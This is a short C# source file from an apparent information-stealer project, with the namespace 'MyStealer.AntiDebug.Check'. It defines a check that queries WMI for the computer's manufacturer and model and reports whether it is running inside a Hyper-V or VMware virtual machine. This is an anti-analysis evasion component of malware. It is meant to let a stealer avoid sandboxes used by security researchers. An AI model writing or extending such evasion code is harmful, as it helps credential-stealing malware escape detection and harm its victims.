using System;
using System.Management;

namespace MyStealer.AntiDebug.Check
{
    internal class ModelName : CheckBase
    {
        public override string Name => "Computor Model Name";

        public override bool CheckPassive()
        {
            using (var ObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            using (var ObjectItems = ObjectSearcher.Get())
            {
                foreach (var Item in ObjectItems)
                {
                    var ManufacturerString = Item["Manufacturer"].ToString();
                    var ModelName = Item["Model"].ToString();
                    if (string.Equals(Item["Manufacturer"].ToString(), "Microsoft Corporation", StringComparison.OrdinalIgnoreCase)
                        && ModelName.IndexOf("Virtual", StringComparison.OrdinalIgnoreCase) >= 0
                        || ManufacturerString.IndexOf("vmware", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        return true;
                    }
                }
            }
            return false;
        }
    }
}
